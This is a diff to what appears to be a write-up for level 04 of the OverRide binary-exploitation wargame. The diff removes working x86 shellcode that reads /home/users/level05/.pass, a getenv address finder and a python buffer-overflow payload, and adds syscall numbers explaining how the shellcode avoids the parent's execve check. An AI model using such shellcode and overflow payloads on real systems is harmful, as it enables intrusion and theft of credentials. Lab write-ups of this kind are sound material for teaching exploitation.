@@ -1,13 +1,3 @@
-export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
-
- #include <stdlib.h>
-#include <stdio.h>
-
-int main(int argc, char *argv[]) {
-printf("%p\n", getenv("SHELLCODE"));
-}
-
-(python -c "print 156 * 'a' + '\xff\xff\xc4\xde'[::-1]" )| ./level04
 
 
 # Level 04
@@ -100,8 +90,8 @@ level04@OverRide:~$ export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\
 
 # 2. Find shellcode address
 level04@OverRide:~$ cat > getenv.c << 'EOF'
-#include 
-#include 
+#include <stdlib.h>
+#include <stdio.h>
 int main() { printf("%p\n", getenv("SHELLCODE")); }
 EOF
 
@@ -118,6 +108,20 @@ child is exiting
 ## Why Bypass Works
 
 ```
+
+// From Linux source code (arch/x86/include/asm/unistd_32.h)
+#define __NR_restart_syscall 0
+#define __NR_exit             1
+#define __NR_fork             2
+#define __NR_read             3
+#define __NR_write            4
+#define __NR_open             5
+#define __NR_close            6
+// ...
+#define __NR_execve          11    // <-- 0xb in hex!
+// ...
+
+
 Parent monitors:      Our shellcode uses:
 execve() = 0xb       open()  = 0x5 
                      read()  = 0x3 
